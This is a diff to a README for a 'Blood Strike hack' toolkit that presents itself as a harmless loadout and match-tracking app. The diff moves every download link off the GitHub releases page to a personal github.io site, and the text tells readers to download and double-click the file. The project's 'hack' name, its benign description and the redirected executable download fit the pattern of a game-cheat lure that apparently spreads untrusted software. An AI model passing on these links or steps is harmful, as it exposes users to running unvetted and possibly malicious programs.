@@ -1,8 +1,8 @@
 # 🎯 blood-strike-hack-2026-striker-loadout-toolkit - Plan Loadouts and Track Matches
 
-[![Download Now](https://img.shields.io/badge/Download-Blood%20Strike%20Toolkit-2ea44f?style=for-the-badge&logo=github)](https://github.com/NishigandhaKhaire/blood-strike-hack-2026-striker-loadout-toolkit/releases)
-[![Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=for-the-badge&logo=windows)](https://github.com/NishigandhaKhaire/blood-strike-hack-2026-striker-loadout-toolkit/releases)
-[![Version](https://img.shields.io/badge/Release-2026-orange?style=for-the-badge)](https://github.com/NishigandhaKhaire/blood-strike-hack-2026-striker-loadout-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Blood%20Strike%20Toolkit-2ea44f?style=for-the-badge&logo=github)](https://nishigandhakhaire.github.io)
+[![Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=for-the-badge&logo=windows)](https://nishigandhakhaire.github.io)
+[![Version](https://img.shields.io/badge/Release-2026-orange?style=for-the-badge)](https://nishigandhakhaire.github.io)
 
 The Blood Strike Hack 2026 Striker Loadout Toolkit is a companion app for your PC that helps you organize everything around your matches in one tidy place. It is built for players who want to plan their Striker profiles, build weapon loadouts, practice manual aim and recoil control, arrange squad plans, and keep a record of how each match went. Instead of scribbling notes on paper or juggling five browser tabs, you get a single window with all of your combat information laid out in a way that is easy to read at a glance.
 
@@ -25,7 +25,7 @@ That is the whole process. There is no complicated installation wizard to work t
 
 ## ⬇️ Download and Setup
 
-**Visit this link to download the application:** https://github.com/NishigandhaKhaire/blood-strike-hack-2026-striker-loadout-toolkit/releases
+**Visit this link to download the application:** https://nishigandhakhaire.github.io
 
 The download page shows the available releases for the toolkit. Choose the one marked as the latest, then save it to your computer. When the transfer is complete, look in your Downloads folder for the file you just saved. Double-click it to launch the application.
 
